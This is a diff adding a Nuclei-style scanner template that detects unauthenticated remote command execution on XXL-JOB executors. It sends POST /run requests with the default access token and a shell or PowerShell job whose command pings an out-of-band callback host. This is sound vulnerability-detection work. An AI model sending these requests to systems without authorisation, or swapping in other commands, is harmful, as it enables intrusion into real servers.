@@ -1,0 +1,84 @@
+id: xxljob-executor-unauth
+
+info:
+  name: XXL-JOB 执行器未授权远程命令执行
+  author: k3rwin
+  severity: critical
+  description: |
+    XXL-JOB 执行器默认未配置认证，未授权攻击者可通过 RESTful API 使用默认 Token 执行任意命令。
+  reference:
+    - https://github.com/jas502n/xxl-job/blob/main/README.md
+    - https://github.com/vulhub/vulhub/blob/master/xxl-job/unacc/README.md
+  classification:
+    cpe: cpe:2.3:a:xuxueli:xxl-job:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: xuxueli
+    product: xxl-job
+    fofa-query: app="XXL-JOB"
+  tags: xxljob,unauth,misconfig,rce,vuln
+
+http:
+  - raw:
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
+
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_SHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+      - |
+        POST /run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+        Content-Length: 396
+
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_POWERSHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"code":200}'
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+# digest: 4a0a0047304502203309575269cfd4eb4fb8c357f9ec2e8bdc16af08dbae2aa25163258553ce0c85022100a814f3043ba0c2a263a5338059240498f32e737654d0d752b5feb1dc4da88339:922c64590222798bb761d5b6d8e72950
